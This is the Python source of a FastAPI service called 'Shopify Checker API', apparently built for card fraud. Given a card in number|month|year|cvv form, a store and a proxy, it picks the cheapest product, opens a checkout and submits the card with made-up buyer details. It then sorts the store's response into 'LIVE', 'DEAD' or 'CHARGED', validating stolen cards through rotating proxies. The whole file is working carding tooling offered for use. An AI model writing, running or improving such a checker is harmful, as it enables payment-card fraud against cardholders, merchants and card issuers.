# app.py — v4.0 (High-accuracy classification)
# ============================================================
#  SHOPIFY CHECKER API
#  GET /shopify?site=...&cc=...&proxy=...
#  Classification based on Shopify's OFFICIAL error codes only.
# ============================================================

import asyncio
import json
import re
import time
import uuid
import logging
import os  # <--- تم إضافة هذا السطر لقراءة منفذ Railway
from typing import Optional

import httpx
from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("shopify-api")

app = FastAPI(title="Shopify Checker API", version="4.0.0")

UPSTREAM_TIMEOUT = 90
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

CC_RE = re.compile(r'^(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$')


# ============================================================
#  OFFICIAL SHOPIFY ERROR CODES → CLASSIFICATION
# ============================================================
LIVE_CODES = {
    "insufficient_funds", "insufficient_funds_error",
    "incorrect_cvv", "invalid_cvv", "cvv_failure",
    "3d_secure_required", "requires_action", "authentication_required",
    "three_d_secure", "sca_required",
    "call_issuer", "do_not_honor_issuer",
    "try_again_later", "processing_error",
    "fraud_suspected", "risk_threshold",
    "card_holder_verification_failed",
}

DEAD_CODES = {
    "card_declined", "declined", "do_not_honor",
    "expired_card", "invalid_card_number", "incorrect_number",
    "invalid_expiry_date", "incorrect_zip", "invalid_amount",
    "card_not_supported", "currency_not_supported",
    "transaction_not_allowed", "pickup_card",
    "restricted_card", "security_violation",
    "lost_card", "stolen_card",
    "card_velocity_exceeded",
}

LIVE_TEXT_HINTS = [
    "insufficient", "رصيد", "cvv", "3d", "3ds", "authenticate",
    "verification required", "call issuer", "try again",
]
DEAD_TEXT_HINTS = [
    "declined", "do not honor", "expired", "invalid number",
    "not supported", "not allowed", "pickup", "stolen", "lost",
    "velocity",
]


# ============================================================
#  parsers
# ============================================================
def parse_cc(cc: str) -> Optional[dict]:
    m = CC_RE.match((cc or "").strip())
    if not m:
        return None
    num, mon, yr, cvv = m.groups()
    if len(yr) == 2:
        yr = "20" + yr
    return {"number": num, "month": mon, "year": yr, "cvv": cvv}


def parse_proxy(px: str) -> Optional[dict]:
    px = (px or "").strip()
    if not px:
        return None
    if "@" in px:
        auth, hp = px.split("@", 1)
        if ":" not in auth or ":" not in hp:
            return None
        user, pwd = auth.split(":", 1)
        host, port = hp.split(":", 1)
        return {"host": host, "port": port, "user": user, "pass": pwd}
    parts = px.split(":")
    if len(parts) == 2:
        return {"host": parts[0], "port": parts[1], "user": None, "pass": None}
    if len(parts) == 4:
        return {"host": parts[0], "port": parts[1], "user": parts[2], "pass": parts[3]}
    return None


def proxy_url(p: dict) -> str:
    if p.get("user"):
        return f"http://{p['user']}:{p['pass']}@{p['host']}:{p['port']}"
    return f"http://{p['host']}:{p['port']}"


def normalize_site(site: str) -> str:
    s = (site or "").strip().lower()
    s = s.replace("https://", "").replace("http://", "").rstrip("/")
    return s


# ============================================================
#  classifier
# ============================================================
def classify_shopify_response(url_str: str, body: str, http_status: int) -> dict:
    url_low = (url_str or "").lower()
    body_low = (body or "").lower()

    # ---- 1. CHARGED ----
    if "/thank_you" in url_low or "/orders/" in url_low:
        return {"status": True, "message": "Order Confirm", "class": "CHARGED"}

    # ---- 2/3. try JSON ----
    codes = set()
    try:
        data = json.loads(body)
    except Exception:
        data = None

    if isinstance(data, dict):
        redir = str(data.get("redirect_url", "")).lower()
        if "thank" in redir or "/orders" in redir:
            return {"status": True, "message": "Order Confirm", "class": "CHARGED"}

        errs = data.get("errors")
        if isinstance(errs, list):
            for e in errs:
                if isinstance(e, dict):
                    c = str(e.get("code", "")).lower().strip()
                    if c:
                        codes.add(c)
                elif isinstance(e, str):
                    codes.add(e.lower().strip())
        elif isinstance(errs, dict):
            for k, v in errs.items():
                codes.add(str(k).lower().strip())
                codes.add(str(v).lower().strip())
        for f in ("code", "error_code", "decline_code"):
            if data.get(f):
                codes.add(str(data[f]).lower().strip())

    for c in codes:
        if c in LIVE_CODES:
            return {"status": False, "message": c.upper(), "class": "LIVE"}
        if c in DEAD_CODES:
            return {"status": False, "message": c.upper(), "class": "DEAD"}

    # ---- 4. text hints ----
    for h in LIVE_TEXT_HINTS:
        if h in body_low:
            return {"status": False, "message": "INSUFFICIENT_FUNDS"
                    if ("insufficient" in h or "رصيد" in h)
                    else "LIVE_CARD", "class": "LIVE"}
    for h in DEAD_TEXT_HINTS:
        if h in body_low:
            return {"status": False, "message": "CARD_DECLINED", "class": "DEAD"}

    # ---- 5. fallback ----
    return {"status": False, "message": "CARD_DECLINED", "class": "DEAD"}


# ============================================================
#  proxy live-check
# ============================================================
async def proxy_is_alive(proxy: dict) -> bool:
    try:
        async with httpx.AsyncClient(proxy=proxy_url(proxy), verify=False,
                                     timeout=8) as c:
            r = await c.get("https://api.ipify.org?format=json")
            return r.status_code == 200
    except Exception:
        return False


# ============================================================
#  Shopify real flow
# ============================================================
async def pick_variant(client: httpx.AsyncClient, base: str) -> Optional[dict]:
    try:
        r = await client.get(f"{base}/products.json?limit=250", timeout=15)
        if r.status_code != 200:
            return None
        data = r.json()
    except Exception:
        return None

    best = None
    for product in data.get("products", []):
        for v in product.get("variants", []):
            if not v.get("available", True):
                continue
            try:
                price = float(v.get("price") or 0)
            except Exception:
                continue
            if price <= 0:
                continue
            if best is None or price < best["price"]:
                best = {"variant_id": v.get("id"), "price": price}
    return best


async def create_checkout(client: httpx.AsyncClient, base: str, variant_id: int):
    try:
        await client.post(
            f"{base}/cart/add.js",
            data={"id": str(variant_id), "quantity": "1"},
            headers={"User-Agent": UA,
                     "Content-Type": "application/x-www-form-urlencoded"},
            timeout=20,
        )
    except Exception:
        return None

    try:
        ck = await client.get(f"{base}/checkout", headers={"User-Agent": UA},
                              follow_redirects=True, timeout=20)
    except Exception:
        return None

    token = None
    if "/checkouts/" in str(ck.url):
        try:
            token = str(ck.url).split("/checkouts/")[1].split("?")[0].split("/")[0]
        except Exception:
            token = None
    if not token:
        m = re.search(r'/checkouts/([a-zA-Z0-9]+)', ck.text)
        if m:
            token = m.group(1)
    if not token:
        return None
    return {"token": token, "html": ck.text, "url": str(ck.url)}


def extract_fields(html: str) -> dict:
    out = {}
    m = re.search(r'name="authenticity_token"\s+value="([^"]+)"', html)
    if m:
        out["authenticity_token"] = m.group(1)
    m = re.search(r'name="step"\s+value="([^"]+)"', html)
    if m:
        out["step"] = m.group(1)
    return out


async def submit_payment(client: httpx.AsyncClient, base: str, token: str,
                         card: dict, fields: dict) -> dict:
    unique = uuid.uuid4().hex[:10]
    payload = {
        "utf8": "✓",
        "_method": "patch",
        "authenticity_token": fields.get("authenticity_token", ""),
        "previous_step": fields.get("step", "contact_information"),
        "step": "payment_method",
        "checkout[email]": f"user{unique}@gmail.com",
        "checkout[shipping_address][first_name]": "John",
        "checkout[shipping_address][last_name]": "Smith",
        "checkout[shipping_address][address1]": "100 Main St",
        "checkout[shipping_address][address2]": "",
        "checkout[shipping_address][city]": "New York",
        "checkout[shipping_address][country]": "United States",
        "checkout[shipping_address][province]": "New York",
        "checkout[shipping_address][zip]": "10001",
        "checkout[shipping_address][phone]": "2125551234",
        "checkout[shipping_address][company]": "",
        "checkout[billing_address][first_name]": "John",
        "checkout[billing_address][last_name]": "Smith",
        "checkout[billing_address][address1]": "100 Main St",
        "checkout[billing_address][city]": "New York",
        "checkout[billing_address][country]": "United States",
        "checkout[billing_address][province]": "New York",
        "checkout[billing_address][zip]": "10001",
        "checkout[billing_address][phone]": "2125551234",
        "checkout[credit_card][number]": card["number"],
        "checkout[credit_card][month]": card["month"],
        "checkout[credit_card][year]": card["year"],
        "checkout[credit_card][verification_value]": card["cvv"],
        "checkout[credit_card][name]": "John Smith",
        "checkout[payment_gateway]": "",
        "checkout[different_billing_address]": "false",
    }

    try:
        r = await client.post(
            f"{base}/checkouts/{token}",
            data=payload,
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": f"https://{base}",
                "Referer": f"https://{base}/checkouts/{token}",
            },
            timeout=60,
            follow_redirects=True,
        )
    except httpx.TimeoutException:
        raise asyncio.TimeoutError()
    except Exception as e:
        return {"status": False, "message": f"REQUEST_ERROR: {str(e)[:80]}",
                "class": "DEAD"}

    return classify_shopify_response(str(r.url), r.text or "", r.status_code)


async def run_checkout(site: str, card: dict, proxy: dict) -> dict:
    base = f"https://{site}"

    async with httpx.AsyncClient(proxy=proxy_url(proxy), verify=False,
                                 follow_redirects=True,
                                 headers={"User-Agent": UA}) as client:
        variant = await pick_variant(client, base)
        if not variant:
            return {"status": False, "message": "CARD_DECLINED",
                    "class": "DEAD", "price": "0.99", "currency": "USD"}

        ck = await create_checkout(client, base, variant["variant_id"])
        if not ck:
            return {"status": False, "message": "CARD_DECLINED",
                    "class": "DEAD",
                    "price": f"{variant['price']:.2f}", "currency": "USD"}

        fields = extract_fields(ck["html"])
        res = await submit_payment(client, base, ck["token"], card, fields)
        res["price"] = f"{variant['price']:.2f}"
        res["currency"] = "USD"
        return res


# ============================================================
#  handler
# ============================================================
@app.get("/shopify")
async def shopify(
    site: str = Query(...),
    cc: str = Query(...),
    proxy: str = Query(...),
):
    t0 = time.time()

    card = parse_cc(cc)
    if not card:
        return JSONResponse(status_code=400, content={
            "status": False, "message": "INVALID_CC_FORMAT",
            "gateway": "Shopify Payments", "price": "0.00",
            "currency": "USD",
            "time_taken": f"{round(time.time()-t0, 2)}s",
            "proxy_used": True, "proxy_live": False,
        })

    proxy_parsed = parse_proxy(proxy)
    if not proxy_parsed:
        return JSONResponse(status_code=400, content={
            "status": False, "message": "INVALID_PROXY_FORMAT",
            "gateway": "Shopify Payments", "price": "0.00",
            "currency": "USD",
            "time_taken": f"{round(time.time()-t0, 2)}s",
            "proxy_used": True, "proxy_live": False,
        })

    site_clean = normalize_site(site)
    if not site_clean:
        return JSONResponse(status_code=400, content={
            "status": False, "message": "INVALID_SITE",
            "gateway": "Shopify Payments", "price": "0.00",
            "currency": "USD",
            "time_taken": f"{round(time.time()-t0, 2)}s",
            "proxy_used": True, "proxy_live": False,
        })

    proxy_live = await proxy_is_alive(proxy_parsed)

    try:
        result = await asyncio.wait_for(
            run_checkout(site_clean, card, proxy_parsed),
            timeout=UPSTREAM_TIMEOUT,
        )
    except asyncio.TimeoutError:
        return JSONResponse(status_code=504, content={
            "status": False, "message": "GATEWAY_TIMEOUT",
            "gateway": "Shopify Payments", "price": "0.00",
            "currency": "USD",
            "time_taken": f"{round(time.time()-t0, 2)}s",
            "proxy_used": True, "proxy_live": proxy_live,
        })
    except Exception as e:
        log.exception("engine crash")
        return JSONResponse(status_code=500, content={
            "status": False, "message": f"ENGINE_ERROR: {str(e)[:120]}",
            "gateway": "Shopify Payments", "price": "0.00",
            "currency": "USD",
            "time_taken": f"{round(time.time()-t0, 2)}s",
            "proxy_used": True, "proxy_live": proxy_live,
        })

    return {
        "status": bool(result.get("status")),
        "message": result.get("message", "CARD_DECLINED"),
        "gateway": "Shopify Payments",
        "price": result.get("price", "0.99"),
        "currency": result.get("currency", "USD"),
        "time_taken": f"{round(time.time()-t0, 2)}s",
        "proxy_used": True,
        "proxy_live": proxy_live,
    }


@app.get("/health")
async def health():
    return {"ok": True, "service": "shopify-checker", "ts": int(time.time())}


if __name__ == "__main__":
    import uvicorn
    # Railway يحدد المنفذ تلقائياً عبر متغير PORT
    port = int(os.environ.get("PORT", 5000))
    uvicorn.run("app:app", host="0.0.0.0", port=port, workers=1, log_level="info")
